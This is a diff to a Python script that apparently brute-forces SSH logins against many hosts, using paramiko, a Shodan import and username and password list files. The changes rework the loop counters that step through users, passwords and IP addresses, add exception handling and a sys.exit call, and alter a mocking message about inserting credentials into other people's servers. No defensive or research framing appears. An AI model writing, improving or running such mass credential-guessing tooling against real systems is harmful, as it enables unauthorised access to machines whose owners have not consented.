@@ -2,6 +2,7 @@ import paramiko
 from paramiko import SSHClient, AutoAddPolicy
 import shodan
 import time
+import sys
 paramiko.util.log_to_file("unwanted.log", level = "WARN")
 
 API_KEY = ""
@@ -10,6 +11,7 @@ log = "log.txt"
 user_file = "user.txt"
 pass_file = "pass.txt"
 update = 0
+userdate = 0
 IP = 0
 Users = 0
 Passes = 0
@@ -76,6 +78,7 @@ while(update < len(D)):
         time.sleep(5)
         IP = IP + 1
         Users = Users + 1
+        userdate = userdate + 1
         Passes = Passes + 1
 
     except paramiko.ssh_exception.AuthenticationException:
@@ -85,6 +88,10 @@ while(update < len(D)):
     except paramiko.ssh_exception.NoValidConnectionsError:
         pass
 
+    except IndexError:
+        Users = 0
+        IP = IP + 1
+        pass
     except paramiko.ssh_exception.BadAuthenticationType:
         pass
     except paramiko.ssh_exception.SSHException:
@@ -98,14 +105,17 @@ while(update < len(D)):
     if(update == len(D)):
         update = 0
         Passes = 0
+        userdate = userdate + 1
         Users = Users + 1
         continue
 
-    if(update == len(B)):
-        Users = Users + 1
+    if(userdate == len(B)):
+        IP = IP + 1
+        Users = 0
+        Passes = 0
         continue
 
     if(update == len(bun)):
-        print("All attempts at inserting my creds into your mother server(s) were unsuccessful")
+        print("I'm done inserting my creds into your mother server(s), thank you for watching.")
         break
-
+sys.exit()
